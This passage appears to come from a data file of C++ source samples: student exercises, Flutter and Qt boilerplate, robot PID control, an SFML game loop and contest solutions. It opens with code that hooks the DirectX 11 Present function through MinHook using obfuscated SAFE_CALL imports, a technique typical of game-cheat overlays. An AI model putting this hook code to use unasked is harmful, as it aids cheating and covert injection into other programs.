= 60;\r\n\trefreshRate.Denominator = 1;\r\n\r\n\tDXGI_MODE_DESC bufferDesc;\r\n\tbufferDesc.Width = 100;\r\n\tbufferDesc.Height = 100;\r\n\tbufferDesc.RefreshRate = refreshRate;\r\n\tbufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;\r\n\tbufferDesc.ScanlineOrdering = DXGI_MODE_SCANLINE_ORDER_UNSPECIFIED;\r\n\tbufferDesc.Scaling = DXGI_MODE_SCALING_UNSPECIFIED;\r\n\r\n\tDXGI_SAMPLE_DESC sampleDesc;\r\n\tsampleDesc.Count = 1;\r\n\tsampleDesc.Quality = 0;\r\n\r\n\tDXGI_SWAP_CHAIN_DESC swapChainDesc;\r\n\tswapChainDesc.BufferDesc = bufferDesc;\r\n\tswapChainDesc.SampleDesc = sampleDesc;\r\n\tswapChainDesc.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;\r\n\tswapChainDesc.BufferCount = 1;\r\n\tswapChainDesc.OutputWindow = WindowA;\r\n\tswapChainDesc.Windowed = 1;\r\n\tswapChainDesc.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;\r\n\tswapChainDesc.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;\r\n\r\n\tIDXGISwapChain* swapChain;\r\n\tID3D11Device* device;\r\n\tID3D11DeviceContext* context;\r\n\r\n\tif (((long(__stdcall*)(\r\n\t\tIDXGIAdapter*,\r\n\t\tD3D_DRIVER_TYPE,\r\n\t\tHMODULE,\r\n\t\tUINT,\r\n\t\tconst D3D_FEATURE_LEVEL*,\r\n\t\tUINT,\r\n\t\tUINT,\r\n\t\tconst DXGI_SWAP_CHAIN_DESC*,\r\n\t\tIDXGISwapChain**,\r\n\t\tID3D11Device**,\r\n\t\tD3D_FEATURE_LEVEL*,\r\n\t\tID3D11DeviceContext**))(D3D11CreateDeviceAndSwapChain))(0, D3D_DRIVER_TYPE_HARDWARE, 0, 0, featureLevels, 2, D3D11_SDK_VERSION, &swapChainDesc, &swapChain, &device, &featureLevel, &context) < 0)\r\n\t{\r\n\t\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\t\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\t\treturn false;\r\n\t}\r\n\r\n\tg_methodsTable = (uint64_t*)calloc(205, sizeof(uint64_t));\r\n\r\n\tmemcpy(g_methodsTable, *(uint64_t**)swapChain, 18 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18, *(uint64_t**)device, 43 * sizeof(uint64_t));\r\n\tmemcpy(g_methodsTable + 18 + 43, *(uint64_t**)context, 144 * sizeof(uint64_t));\r\n\r\n\tMH_Initialize();\r\n\r\n\tswapChain->Release();\r\n\tswapChain = 0;\r\n\r\n\tdevice->Release();\r\n\tdevice = 0;\r\n\r\n\tcontext->Release();\r\n\tcontext = 0;\r\n\r\n\tSAFE_CALL(DestroyWindow)(WindowA);\r\n\tSAFE_CALL(UnregisterClassA)(Window.lpszClassName, Window.hInstance);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool Hook::Present(void** hk_originalFunction, void* hk_hookedPresent)\r\n{\r\n\tif (!hk_originalFunction || !hk_hookedPresent)\r\n\t\treturn false;\r\n\r\n\tvoid* target = (void*)g_methodsTable[8];\r\n\r\n\tif (!target)\r\n\t\treturn false;\r\n\r\n\tif (MH_CreateHook(target, hk_hookedPresent, hk_originalFunction) != MH_OK || MH_EnableHook(target) != MH_OK)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\r\n\treturn true;\r\n}",
    "#include<iostream>\r\nusing namespace std;\r\nconst int max_size=10;\r\nstruct product\r\n{\r\n\tint id;\r\n\tchar name[20];\r\n\tfloat price,gst,totalprice;\r\n};\r\nint main()\r\n{\r\n\tproduct p[max_size];\r\n\tint temp=0,next=-1,choice;\r\n\r\n\twhile(temp!=2)\r\n\t{\r\n\t\tcout<<\" enter the choice 1.insert,2.delete,3.dislpay\"<<endl;\r\n\t\tcin>>choice;\r\n\t\tswitch(choice)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\tif(next==max_size)\r\n\t\t\t\t{\r\n\t\t\t\t\tcout<<\"list is full \"<<endl;\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t{\r\n\t\t\t\t\tnext++;\r\n\t\t\t\t\tcout<<\"enter  the product  name\"<<endl;\r\n\t\t\t\t\tcin>>p[next].name;\r\n\t\t\t\t\t\tcout<<\"enter  the product  id\"<<endl;\r\n\t\t\t\t\tcin>>p[next].id;\r\n\t\t\t\t\t\tcout<<\"enter  the product  price\"<<endl;\r\n\t\t\t\t\tcin>>p[next].price;\r\n\t\t\t\t\t\tcout<<\"enter  the product gst\"<<endl;\r\n\t\t\t\t\tcin>>p[next].gst;\r\n\t\t\t\t\t\r\n\t\t\t\t\t\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\tcase 2:\r\n\t\t\t\t\tif(next==-1)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"list is underflow \"<<endl;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tnext--;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\tcase 3:\r\n\t\t\t\t\t\tif(next==-1)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tcout<<\"list is empty\"; \r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\telse\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tfor(int i=0; i<=next; i++)\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\tcout<<\"product name...........\"<<p[i].name<<endl;\r\n\t\t\t\t\t\t\t\tcout<<\"product name...........\"<<p[i].id<<endl;\r\n\t\t\t\t\t\t\t\tcout<<\"product name...........\"<<p[i].price<<endl;\r\n\t\t\t\t\t\t\t\tcout<<\"product name...........\"<<p[i].gst<<endl;\r\n\t\t\t\t\t\t\t\tcout<<\"-----------------------------------------------\"<<endl;\r\n\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\tdefault:\r\n\t\t\t\t\t\tcout<<\"wrong choise\";\r\n\t\t\t\t\t\tbreak;\r\n\t\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t}\r\n\t\t\r\n\t}\r\n}\r\n\r\n",
    "#include \"Service.hh\"\n#include <iostream>\n\nusing namespace std;\n\nint main() {\n\tsetlocale(LC_ALL, \"Polish\");\n\n\tstring carMake, carModel, customerName, customerAddress, customerPhone;\n\tint carYear;\n\tdouble partsCost, laborCost;\n\n\tcout << \"Creating new service...\" << endl;\n\tcout << \"Please enter the following information:\" << endl;\n\tcout << \"Enter car make: \";\n\tgetline(cin, carMake);\n\tcout << \"Enter car model: \";\n\tgetline(cin, carModel);\n\tcout << \"Enter car year: \";\n\tcin >> carYear;\n\tcin.ignore(); // Ignore the newline character left by previous input\n\tcout << \"Enter customer name: \";\n\tgetline(cin, customerName);\n\tcout << \"Enter customer address: \";\n\tgetline(cin, customerAddress);\n\tcout << \"Enter customer phone: \";\n\tgetline(cin, customerPhone);\n\tcout << \"Enter parts cost: \";\n\tcin >> partsCost;\n\tcout << \"Enter labor cost: \";\n\tcin >> laborCost;\n\n\tcout << endl << endl << \"Generating new service...\" << endl\n\t\t<< \"Creating new car...\" << endl;\n\tCar car(carMake, carModel, carYear);\n\n\tcout << \"Car created...\" << endl\n\t\t<< \"Creating new customer...\" << endl;\n\tCustomer customer(customerName, customerAddress, customerPhone);\n\n\tcout << \"Customer created...\" << endl\n\t\t<< \"Creating new service quote...\" << endl;\n\n\tServiceQuote serviceQuote(partsCost, laborCost);\n\tcout << \"Service quote created...\" << endl;\n\n\tService service(car, customer, serviceQuote);\n\tcout << \"Service created...\" << endl;\n\n\tcout << \"Service cost: \" << service.getCost() << endl;\n\n\tcout << endl << endl << endl << \"Press enter to exit...\";\n\treturn !!!getchar();\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\n#include <string>\n\nusing namespace std;\n\nclass Book {\npublic:\n    string title;\n    string author;\n\n    Book(string t, string a)\n    {\n        title = t;\n        author = a;\n    }\n};\n\nclass Library {\nprivate:\n    static const int Max_Books = 100;\n    Book* books[Max_Books];\n    int num_books;\n\npublic:\n    Library()\n    {\n        num_books = 0;\n   \n    }\n\n    void add_book(Book* book) {\n        if (num_books < Max_Books) {\n            books[num_books++] = book;\n        }\n        else {\n            cout << \"Library is full!\" << endl;\n        }\n    }\n\n    void remove_book(Book* book) {\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i] == book) {\n             \n                books[i] = books[num_books - 1];\n                num_books--;\n                cout << \"Book removed from the library.\" << endl;\n                return;\n            }\n        }\n        cout << \"Book not found in the library.\" << endl;\n    }\n\n    void search_by_title(string title) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->title == title) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"No books found with the given title.\" << endl;\n        }\n    }\n\n    void search_by_author(string author) {\n        bool found = false;\n        for (int i = 0; i < num_books; ++i) {\n            if (books[i]->author == author) {\n                cout << \"Title: \" << books[i]->title << \", Author: \" << books[i]->author << endl;\n                found = true;\n            }\n        }\n        if (!found) {\n            cout << \"This Author has not written any book.\" << endl;\n        }\n    }\n  \n};\n\nint main() {\n    Library library;\n\n    Book book1(\"Object Oriented Programming\", \"Tonny Gaddis\");\n    Book book2(\"C++ by Me\", \"Mr Abdullah\");\n\n    library.add_book(&book1);\n    library.add_book(&book2);\n\n    cout << \"Books by title:\" << endl;\n    library.search_by_title(\"Object Oriented Programming\");\n\n    cout << \"\\nBooks by author:\" << endl;\n    library.search_by_author(\"Mr Abdullah\");\n\n    cout << \"\\nRemoving a book...\" << endl;\n    library.remove_book(&book1);\n\n    return 0;\n}\n",
    "#include \"cavity.h\"\n#include \"AS5600_IIC.h\"\n#include \"DAC.h\"\n\nint init_angle_4096[2][3]{0};           // Initial encoder reading (absolute value).\nint pre_angle_4096[2][3]{0};            // Previous encoder reading (relative to initial value).\nint n_turns[2][3] = {0};                // Current encoder revolutions.\ndouble voltage[2][3]{0};                // Current proportional valve voltage.\n\n// PID\ndouble integral_bias[2][3]{0};          // Cumulative error in PID control.\ndouble last_input[2][3]{0};\nunsigned long last_time[2][3]{0};\n\nconst unsigned int sample_time = 40;  //40ms\n/*const double Kp = 0.004;\nconst double Ki = 0.00000;\nconst double Kd = 0.08;*/\n/*const double Kp = 0.004;\nconst double Ki = 0.000;\nconst double Kd = 0.06;*/\nconst double Kp = 0.004;\nconst double Ki = 0.000;\nconst double Kd = 0.06;\n\ntemplate<typename T>\nT max3(const T x1, const T x2, const T x3) {\n    T res = x1;\n    res = res > x2? res : x2;\n    res = res > x3? res : x3;\n    return res;\n}\n\nvoid init_cavities(int n_section) {\n    // Initialize encoder, DAC.\n    for (int i = 0; i < n_section; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            pinMode(encoder_pins[i][j][0], OUTPUT);\n            pinMode(encoder_pins[i][j][1], OUTPUT);\n            digitalWrite(encoder_pins[i][j][0], 1);\n            digitalWrite(encoder_pins[i][j][0], 1);\n            init_DAC_out_port(i * 3 + j);\n            write_DAC(i * 3 + j, 0);\n        }\n    }\n    delay(2000);\n    // Initial deflection angle.\n    for (int i = 0; i < n_section; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            init_angle_4096[i][j] = read_sensor_values(encoder_pins[i][j][0], encoder_pins[i][j][1]);\n        }\n    }\n}\n\n// Read encoder angle.\ndouble get_angle(const int section, const int cavity) {\n    int data = read_sensor_values(encoder_pins[section][cavity][0], \n                encoder_pins[section][cavity][1]) - init_angle_4096[section][cavity];\n    int res;\n    if (data < 0) {\n      data = data + 4096;\n    }\n    if (data - pre_angle_4096[section][cavity] > 3500) { // A sudden increase indicates reverse rotation crossing over the zero point.\n      n_turns[section][cavity]--;\n    } else if (data - pre_angle_4096[section][cavity] < -3500) { // A sudden decrease indicates forward rotation crossing over the zero point.\n      n_turns[section][cavity]++;\n    }\n    res = data + n_turns[section][cavity] * 4096;\n\n    pre_angle_4096[section][cavity] = data;\n\n    return -(double)res * 360 / 4096;\n}\n\n// Position closed-loop.\ndouble Position_PID(const int section, const int cavity, const double input, const double target) {\n    unsigned long now = millis();\n    unsigned long time_change = (now - last_time[section][cavity]);\n    //Serial.println(time_change);\n    if (time_change >= sample_time) {\n      double error = target - input;    // Error\n      integral_bias[section][cavity] += error; // Cumulative error\n      double derivative = input - last_input[section][cavity]; // Derivative\n\n      // Calculate PID output.\n      double out = Kp * error + Ki * integral_bias[section][cavity] - Kd * derivative;\n\n      // Update parameters.\n      last_input[section][cavity] = input;\n      last_time[section][cavity] = now;\n      return out;\n    }\n    return -10000;\n}\n\nvoid head_up(const double _target_angle[2][3], const int mask[2][3]) {\n    if (_target_angle[0][0] > 150 && _target_angle[0][1] > 150 && _target_angle[0][2] > 150) return;  //No need to raise the head during maximum contraction.\n\n    double target_angle[2][3]{{80, 40, 40},{80, 40, 40}};\n    //double target_angle[2][3]{{120, 40, 40},{120, 40, 40}};\n\n    // PID Move to the raised head position.\n    double cur_angle[2][3]{0}, error = -10000;\n    // clear PID integral bias and error\n    for (int i = 0; i < 2; ++i) {\n      for (int j = 0; j < 3; ++j) {\n          integral_bias[i][j] = 0;\n      }\n    }\n    for (int i = 0; i < 2; ++i) {\n        for (int j = 0; j < 3; ++j) {\n            cur_angle[i][j] = get_angle(i, j);\n            if (mask[i][j] != 0) {\n                error = max(abs(target_angle[i][j] - cur_angle[i][j]), error);\n            }\n        }\n    }\n  \n    int count = 0;\n    int loop_i = 0;\n    while (count < 1) {\n        error = -10000;\n        for (int i = 0; i < 2; ++i) {\n            for (int j = 0; j < 3; ++j) {\n                if (mask[i][j] != 0) {\n                    double update = Position_PID(i, j, cur_angle[i][j], target_angle[i][j]);\n                    if (update >= -10) {\n                        voltage[i][j] += update;\n                        if (voltage[i][j] > 10) voltage[i][j] = 10;\n                        if (voltage[i][j] < 0) voltage[i][j] = 0;\n                        write_DAC(i * 3 + j, voltage[i][j]);  // 10ms latency\n                    }\n                }\n            }\n        }\n        for (int i = 0; i < 2; ++i) {\n            for (int j = 0; j < 3; ++j) {\n                if (mask[i][j] != 0) {\n                    cur_angle[i][j] = get_angle(i, j);      // 1ms latency\n                    error = max",
    "\n#include <imgui-SFML.h>\n#include <SFML/Graphics/RenderWindow.hpp>\n#include <SFML/System/Clock.hpp>\n#include <SFML/Window/Event.hpp>\n#include \"core/Game.h\"\n#include \"arena/ArenaSurface.h\"\n#include \"registry/PathRegistry.h\"\n#include \"registry/ObstacleRegistry.h\"\n#include \"level_editor/LevelEditor.h\"\n\nint main()\n{\n    std::shared_ptr<sf::RenderWindow> window =\n            std::make_shared<sf::RenderWindow>(sf::VideoMode(1600, 900),\n                                               \"Mission Impossible\",\n                                               sf::Style::Default,\n                                               sf::ContextSettings(0, 0, 8));\n    window->setFramerateLimit(60);\n    if (ImGui::SFML::Init(*window))\n    {\n\n        auto arena = std::make_shared<Arena>();\n        auto arenaSurface = std::make_shared<ArenaSurface>(window, arena, 30);\n        auto game = std::make_shared<Game>(arena, arenaSurface, window);\n        auto levelEditor = std::make_shared<LevelEditor>(arena, arenaSurface, window, game);\n\n        ObstacleRegistry::GetInstance().SetArenaSurface(arenaSurface);\n        PathRegistry::GetInstance().SetArenaSurface(arenaSurface);\n\n        game->Init();\n\n        sf::Clock deltaClock;\n        while (window->isOpen())\n        {\n            sf::Event event{};\n            while (window->pollEvent(event))\n            {\n                if (event.type == sf::Event::Closed)\n                {\n                    window->close();\n                }\n\n                ImGui::SFML::ProcessEvent(*window, event);\n                levelEditor->ProcessEvent(event);\n                game->processEvent(event);\n            }\n\n            auto time = deltaClock.restart();\n\n            ImGui::SFML::Update(*window, time);\n            game->Update(std::min(time.asSeconds(), 0.05f));\n\n            window->clear({210, 210, 210, 255});\n\n            levelEditor->RenderImGui();\n            levelEditor->Draw();\n            game->Draw();\n            ImGui::SFML::Render(*window);\n            window->display();\n        }\n\n        ObstacleRegistry::GetInstance().Dispose();\n        ImGui::SFML::Shutdown();\n    }\n\n    return 0;\n}\n",
    "/****************************************************************************\r\n** Resource object code\r\n**\r\n** Created by: The Resource Compiler for Qt version 6.6.2\r\n**\r\n** WARNING! All changes made in this file will be lost!\r\n*****************************************************************************/\r\n\r\n#ifdef QT_NAMESPACE\r\n#  define QT_RCC_PREPEND_NAMESPACE(name) ::QT_NAMESPACE::name\r\n#  define QT_RCC_MANGLE_NAMESPACE0(x) x\r\n#  define QT_RCC_MANGLE_NAMESPACE1(a, b) a##_##b\r\n#  define QT_RCC_MANGLE_NAMESPACE2(a, b) QT_RCC_MANGLE_NAMESPACE1(a,b)\r\n#  define QT_RCC_MANGLE_NAMESPACE(name) QT_RCC_MANGLE_NAMESPACE2( \\\r\n        QT_RCC_MANGLE_NAMESPACE0(name), QT_RCC_MANGLE_NAMESPACE0(QT_NAMESPACE))\r\n#else\r\n#   define QT_RCC_PREPEND_NAMESPACE(name) name\r\n#   define QT_RCC_MANGLE_NAMESPACE(name) name\r\n#endif\r\n\r\n#ifdef QT_NAMESPACE\r\nnamespace QT_NAMESPACE {\r\n#endif\r\n\r\n#ifdef QT_NAMESPACE\r\n}\r\n#endif\r\n\r\nint QT_RCC_MANGLE_NAMESPACE(qInitResources_File)();\r\nint QT_RCC_MANGLE_NAMESPACE(qInitResources_File)()\r\n{\r\n    return 1;\r\n}\r\n\r\nint QT_RCC_MANGLE_NAMESPACE(qCleanupResources_File)();\r\nint QT_RCC_MANGLE_NAMESPACE(qCleanupResources_File)()\r\n{\r\n    return 1;\r\n}\r\n\r\n#ifdef __clang__\r\n#   pragma clang diagnostic push\r\n#   pragma clang diagnostic ignored \"-Wexit-time-destructors\"\r\n#endif\r\n\r\nnamespace {\r\n   struct initializer {\r\n       initializer() { QT_RCC_MANGLE_NAMESPACE(qInitResources_File)(); }\r\n       ~initializer() { QT_RCC_MANGLE_NAMESPACE(qCleanupResources_File)(); }\r\n   } dummy;\r\n}\r\n\r\n#ifdef __clang__\r\n#   pragma clang diagnostic pop\r\n#endif\r\n",
    "#include <bits/stdc++.h>\r\n#include <ext/pb_ds/assoc_container.hpp>\r\n#include <ext/pb_ds/tree_policy.hpp>\r\n\r\nusing namespace std;\r\nusing namespace __gnu_pbds;\r\n\r\n#define ull unsigned long long int\r\n#define ld long double\r\n#define ll long long\r\n#define PI acos(-1)\r\n#define endl \"\\n\"\r\n#define all(x) x.begin(), x.end()\r\n#define fixed(n) cout << fixed << setprecision(n)\r\n#define loop(i, n) for (int i = 0; i < (int)n; i++)\r\n\r\nconst int OO = 0x3f3f3f3f;\r\nconst int N = 1e5 + 7;\r\nint dx[] = {1, -1, 0, 0};\r\nint dy[] = {0, 0, 1, -1};\r\n\r\nvoid Ahmed_Faraj()\r\n{\r\n    ios_base::sync_with_stdio(false);\r\n    cin.tie(nullptr);\r\n    cout.tie(nullptr);\r\n#ifndef ONLINE_JUDGE\r\n    freopen(\"input.txt\", \"r\", stdin);\r\n    freopen(\"output.txt\", \"w\", stdout);\r\n#endif\r\n}\r\n\r\nvoid solve()\r\n{\r\n    ll n, cnt = 0;\r\n    cin >> n;\r\n    ll arr[n];\r\n    for (size_t i = 0; i < n; i++)\r\n    {\r\n        cin >> arr[i];\r\n    }\r\n    \r\n    sort(arr, arr + n);\r\n    for (size_t i = 0; i < n - 2; i++)\r\n    {\r\n        for (size_t j = i + 1; j < n - 1; j++)\r\n        {\r\n            ll l = j + 1, r = n - 1;\r\n            ll ans = -1, mid;\r\n            while (l <= r)\r\n            {\r\n                mid = l + (r - l) / 2;\r\n                if ((arr[mid] + arr[i] > arr[j]) &&\r\n                    (arr[mid] + arr[j] > arr[i])&&\r\n                    (arr[i] + arr[j] > arr[mid]))\r\n                {\r\n                    // cout << mid << \" \" ;\r\n                    ans = mid;\r\n                    l = mid + 1;\r\n                }\r\n                else\r\n                {\r\n                    r = mid - 1;\r\n                }\r\n            }\r\n            if (ans != -1)\r\n            {\r\n                cnt += ans - j;\r\n            }\r\n            // cout << ans << \" \" << i << \" \" << j << \" \" << mid << endl;\r\n        }\r\n    }\r\n    cout << cnt;\r\n}\r\n\r\nsigned main()\r\n{\r\n    Ahmed_Faraj();\r\n    // fast();\r\n    ll test = 1;\r\n    // cin >> test;\r\n    while (test--)\r\n    {\r\n        solve();\r\n    }\r\n    return 0;\r\n}",
    "#include <bits/stdc++.h>\n#define int long long\nusing namespace std;\n\nvoid solve()\n{\n\n    int n;\n    int k, x;\n    cin >> n >> k;\n    map<int, int> mp;\n    while (n--)\n    {\n        cin >> x;\n        x %= k;\n        if (x)\n            mp[k - x]++;\n    }\n    map<int, int>::iterator it;\n    int mx = 0;\n    for (it = mp.begin(); it != mp.end(); it++)\n    {\n        int x = (it->second - 1) * k + it->first;\n        mx = max(mx, x);\n    }\n    if (mx)\n    {\n        mx++;\n    }\n    cout << mx << \"\\n\";\n\n    return;\n}\nint32_t main()\n{\n    int t;\n    cin >> t;\n    while (t--)\n    {\n        solve();\n    }\n    return 0;\n}\n\n/*\n#include <bits/stdc++.h>\n#define int long long\nusing namespace std;\nint32_t main() {\n\tint x;\n  cin>>x;\n\twhile(x--){\n\t   int n,k;\n\t   cin>>n>>k;\n\t   vector<int>arr;\n\t   unordered_multiset<int>s1,s2;\n\t   for(int i=0;i<n;i++){\n\t     int x;\n\t     cin>>x;\n\t     int p=((k-x%k)%k);\n\t     if(p!=0)arr.push_back((k-x%k)%k);\n\t     //s1.insert((k-x%k)%k);\n\t     // s2.insert((k-x%k)%k);\n\t     \n\t     \n\t   }\n\t   sort(arr.begin(),arr.end());\n\t   int ans=0;\n\t   int t=0;\n\t   while(arr.size()!=0){\n\t   vector<int>v;\n\t   for(auto x:arr){\n      if(x>t){\n\t       ans+=(x-t);\n\t       t=x+1;\n\t     }\n\t     //else if(t==x){\n\t     //  t=x+1;\n\t       \n\t     //}\n\t     else{\n\t       v.push_back(k+x);\n\t     }\n\t   }\n\t   arr=v;\n\t   \n\t}\n\tcout<<ans<<endl;\n\t\n\n}\nreturn 0;\n}*/\n\n",
    "\n#include <iostream>\n#include <map>\n#include <string>\n#include <vector>\n#include <random>\n#include <set>\n#include <fstream>\n#include <sstream>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Pair {\n\tstring word;\n\tstring previous;\n\tstring next;\n\tint position = 0;\n};\n\nstruct WordSet {\n\tstring word;\n\tvector<string> next;\n\tvector<string> previous;\n\tbool is_unique = false;\n};\n\nvector<string> split(const string& text)\n{\n\tvector<string> output;\n\tstring temp = \"\";\n\n\tfor (char c : text) {\n\t\tif (c == ' ') {\n\t\t\toutput.push_back(temp);\n\t\t\ttemp = \"\";\n\t\t}\n\t\telse {\n\t\t\ttemp += c;\n\t\t}\n\t}\n\n\tif (!temp.empty()) {\n\t\toutput.push_back(temp);\n\t}\n\n\treturn output;\n\n}\n\nvector<Pair> find_seed(const vector<string>& words) {\n\tmap<string, int> word_count;\n\tmap<string, int> word_positions;\n\n\t// Count each word and remember the first position\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tword_count[words[i]]++;\n\t\t// Only record the position the first time the word is encountered\n\t\tif (word_count[words[i]] == 1) {\n\t\t\tword_positions[words[i]] = i;\n\t\t}\n\t}\n\n\tvector<Pair> seed;\n\n\t/* Now add to the seed only those words with a count of 1 */\n\tfor (const auto& wc : word_count) {\n\t\tif (wc.second == 1) {\n\t\t\tseed.push_back({ wc.first, \"\", \"\", word_positions[wc.first]});\n\t\t}\n\t}\n\n\treturn seed;\n}\n\nint get_word_index(const string& word, vector<Pair>& words)\n{\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i].word == word) {\n\t\t\treturn i;\n\t\t}\n\t}\n\n\treturn -1;\n\n}\n\nvector<int> get_instances_of_word(string& word, vector<string>& words)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] == word) {\n\t\t\toutput.push_back(i);\n\t\t}\n\t}\n\n\treturn output;\n\n}\n\nstd::map<std::string, WordSet> rule_set(vector<string>& words, vector<Pair>& seed) {\n\tstd::map<std::string, WordSet> rules;\n\n\tfor (const auto& word : words) {\n\t\tauto& ws = rules[word]; // This ensures a WordSet is created for each word, even if it's not in the seed.\n\t}\n\n\t// Process seed words\n\tfor (const auto& s : seed) {\n\t\trules[s.word].is_unique = true;\n\t}\n\n\t// Construct rules based on words vector\n\tfor (size_t i = 0; i < words.size(); ++i) {\n\t\tstring& word = words[i];\n\t\tif (i > 0) {\n\t\t\t// Add the previous word if not the first word\n\t\t\trules[word].previous.push_back(words[i - 1]);\n\t\t}\n\t\tif (i < words.size() - 1) {\n\t\t\t// Add the next word if not the last word\n\t\t\trules[word].next.push_back(words[i + 1]);\n\t\t}\n\t}\n\n\t// Remove duplicates from previous and next vectors\n\tfor (auto& rule : rules) {\n\t\tauto& ws = rule.second;\n\t\tstd::sort(ws.previous.begin(), ws.previous.end());\n\t\tws.previous.erase(std::unique(ws.previous.begin(), ws.previous.end()), ws.previous.end());\n\n\t\tstd::sort(ws.next.begin(), ws.next.end());\n\t\tws.next.erase(std::unique(ws.next.begin(), ws.next.end()), ws.next.end());\n\t}\n\n\treturn rules;\n}\n\nvoid initialize_array(std::vector<std::string>& arr, int size) {\n\tarr.resize(size);\n\tfor (int i = 0; i < size; ++i) {\n\t\tarr[i] = \"_____\";\n\t}\n}\n\nbool vec_contains_str(vector<string>& words, string& word)\n{\n\tfor (string s : words) {\n\t\tif (s == word) { return true; }\n\t}\n\treturn false;\n}\n\nint get_combinations(string& left, string& right, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<string> combos;\n\tif (left != \"_____\") {\n\t\tcombos = rule_set[left].next;\n\t}\n\t\n\tif (right != \"_____\") {\n\t\tif (combos.empty()) {\n\t\t\tcombos = rule_set[right].previous;\n\t\t}\n\t\telse {\n\t\t\tfor (string s : rule_set[right].previous) {\n\t\t\t\tif (!vec_contains_str(combos, s)) { combos.push_back(s); }\n\t\t\t}\n\t\t}\n\t}\n\n\treturn (combos.empty() ? INT_MAX : combos.size());\n}\n\n/* \nindex: index is the position in the vector<string> we are trying to solve\nwords: the array we are trying to solve\nrule_set: the rules of given words\n*/\nint number_of_combinations(int index, vector<string>& words, std::map<std::string, WordSet>& rule_set) {\n\tint num_combos = 0;\n\tstring prev_word = \"_____\";\n\tstring next_word = \"_____\";\n\t/* Check if we can get the previous word */\n\tif (index - 1 >= 0) {\n\t\t/* Get all words this word could be */\n\t\tprev_word = words[index - 1];\n\t}\n\n\tif (index + 1 < words.size()) {\n\t\tnext_word = words[index + 1];\n\t}\n\n\treturn get_combinations(prev_word, next_word, rule_set);\n\n}\n\n\nvector<int> all_entropy(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tvector<int> output;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\toutput.push_back(number_of_combinations(i, words, rule_set));\n\t}\n\n\treturn output;\n}\n\nint find_least_combos(vector<string>& words, std::map<std::string, WordSet>& rule_set)\n{\n\tint lowest_combo = INT_MAX;\n\tint index = -1;\n\n\tfor (int i = 0; i < words.size(); i++) {\n\t\tif (words[i] != \"_____\") {\n\t\t\tcontinue;\n\t\t}\n\n\t\tint value = number_of_combinations(i, words, rule_set);\n\t\tif (value < lowest_combo) {\n\t\t\tlowest_combo = value;\n\t\t\tindex = i;\n\t\t}\n\t}\n\n\treturn index;\n\n}\n\nstring 